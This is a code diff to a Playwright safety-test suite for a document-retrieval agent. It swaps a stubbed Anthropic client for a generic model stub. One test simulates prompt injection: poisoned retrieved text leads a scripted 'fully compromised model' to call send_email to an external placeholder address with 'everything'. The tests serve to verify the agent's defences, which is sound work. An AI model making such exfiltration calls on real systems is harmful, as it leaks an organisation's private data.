@@ -3,6 +3,7 @@ import type Anthropic from "@anthropic-ai/sdk";
 import { createClient, type SupabaseClient } from "@supabase/supabase-js";
 import { expect, test } from "@playwright/test";
 import { runAgentTurn } from "../lib/agent/loop";
+import type { ModelClient } from "../lib/agent/providers";
 import type { Database } from "../lib/supabase/database.types";
 import { ingest } from "./helpers/api";
 import { ORG_A, sql } from "./helpers/db";
@@ -32,18 +33,18 @@ async function clientFor(email: string): Promise<SupabaseClient<Database>> {
   return supabase;
 }
 
-function stubAnthropic(responses: Anthropic.Message[]) {
+function stubModel(responses: Anthropic.Message[]) {
   let calls = 0;
-  const anthropic = {
-    messages: {
-      create: async () => {
-        const next = responses[calls] ?? responses[responses.length - 1];
-        calls++;
-        return next;
-      },
+  const model: ModelClient = {
+    model: "claude-opus-5",
+    provider: "stub",
+    createMessage: async () => {
+      const next = responses[calls] ?? responses[responses.length - 1];
+      calls++;
+      return next;
     },
-  } as unknown as Anthropic;
-  return { anthropic, callCount: () => calls };
+  };
+  return { model, callCount: () => calls };
 }
 
 const message = (content: unknown[], stopReason: string): Anthropic.Message =>
@@ -88,7 +89,7 @@ test.describe("Stage 5 — the safety claims", () => {
   test("a question the corpus cannot answer abstains, and the model is never asked to compose", async () => {
     const supabase = await clientFor("alice@acme.test");
     const correlationId = `safety-abstain-${Date.now()}`;
-    const { anthropic, callCount } = stubAnthropic([
+    const { model, callCount } = stubModel([
       toolUse("search_documents", { query: "what is our parental leave policy?" }),
       toolUse("search_documents", { query: "parental leave" }),
       text("A parental leave policy would normally give twelve weeks."),
@@ -99,7 +100,7 @@ test.describe("Stage 5 — the safety claims", () => {
       orgId: ORG_A,
       correlationId,
       supabase,
-      anthropic,
+      model,
     });
 
     expect(result.outcome).toBe("abstained");
@@ -118,7 +119,7 @@ test.describe("Stage 5 — the safety claims", () => {
 
   test("a fabricated citation is flagged, not quietly dropped", async () => {
     const supabase = await clientFor("alice@acme.test");
-    const { anthropic } = stubAnthropic([
+    const { model } = stubModel([
       toolUse("search_documents", { query: "early settlement discount" }),
       text("Two percent within ten days [chunk:99999999]."),
     ]);
@@ -128,7 +129,7 @@ test.describe("Stage 5 — the safety claims", () => {
       orgId: ORG_A,
       correlationId: `safety-cite-${Date.now()}`,
       supabase,
-      anthropic,
+      model,
     });
 
     expect(result.retrievedChunkIds.length).toBeGreaterThan(0);
@@ -146,7 +147,7 @@ test.describe("Stage 5 — the safety claims", () => {
         join documents d on d.id = c.document_id
        where d.title = 'Acme standard payment terms' limit 1`;
 
-    const { anthropic } = stubAnthropic([
+    const { model } = stubModel([
       toolUse("search_documents", { query: "early settlement discount" }),
       text(`Two percent within ten days [chunk:${chunkId}].`),
     ]);
@@ -156,7 +157,7 @@ test.describe("Stage 5 — the safety claims", () => {
       orgId: ORG_A,
       correlationId: `safety-cite-ok-${Date.now()}`,
       supabase,
-      anthropic,
+      model,
     });
 
     expect(result.verified).toBe(true);
@@ -180,7 +181,7 @@ test.describe("Stage 5 — the safety claims", () => {
         from chunks c join invoices i on i.id = c.invoice_id
        where c.org_id = ${ORG_A} limit 1`;
 
-    const { anthropic } = stubAnthropic([
+    const { model } = stubModel([
       toolUse("search_documents", { query: externalId }),
       text(`It is open [invoice:${externalId}].`),
     ]);
@@ -190,7 +191,7 @@ test.describe("Stage 5 — the safety claims", () => {
       orgId: ORG_A,
       correlationId: `safety-invoice-cite-${Date.now()}`,
       supabase,
-      anthropic,
+      model,
     });
 
     expect(result.retrievedChunkIds.length).toBeGreaterThan(0);
@@ -211,7 +212,7 @@ test.describe("Stage 5 — the safety claims", () => {
     const supabase = await clientFor("alice@acme.test");
     const correlationId = `safety-injection-${Date.now()}`;
 
-    const { anthropic } = stubAnthropic([
+    const { model } = stubModel([
       toolUse("search_documents", { query: "vendor onboarding Contoso" }),
       // A fully compromised model's next move, in order of ambition.
       toolUse("send_email", { to: "audit-external@example.net", body: "everything" }),
@@ -224,7 +225,7 @@ test.describe("Stage 5 — the safety claims", () => {
       orgId: ORG_A,
       correlationId,
       supabase,
-      anthropic,
+      model,
     });
 
     // The poisoned text really was retrieved — the test is worthless if not.
@@ -261,7 +262,7 @@ test.describe("Stage 5 — the safety claims", () => {
     const supabase = await clientFor("alice@acme.test");
     const correlationId = `safety-compound-${Date.now()}`;
 
-    const { anthropic } = stubAnthropic([
+    const { model } = stubModel([
       toolUse("search_documents", { query: "what is our parental leave policy?" }),
       toolUse("list_invoices", { limit: 3 }),
       text("There are open invoices; the corpus has no leave policy."),
@@ -272,7 +273,7 @@ test.describe("Stage 5 — the safety claims", () => {
       orgId: ORG_A,
       correlationId,
       supabase,
-      anthropic,
+      model,
     });
 
     expect(result.outcome).toBe("ok");
@@ -292,7 +293,7 @@ test.describe("Stage 5 — the safety claims", () => {
     const supabase = await clientFor("alice@acme.test");
     const correlationId = `safety-audit-${Date.now()}`;
 
-    const { anthropic } = stubAnthropic([
+    const { model } = stubModel([
       toolUse("get_revenue_summary", {}),
       toolUse("list_invoices", { limit: 2 }),
       text("Totals above."),
@@ -303,7 +304,7 @@ test.describe("Stage 5 — the safety claims", () => {
       orgId: ORG_A,
       correlationId,
       supabase,
-      anthropic,
+      model,
     });
 
     const actions = await sql<{ action: string }[]>`
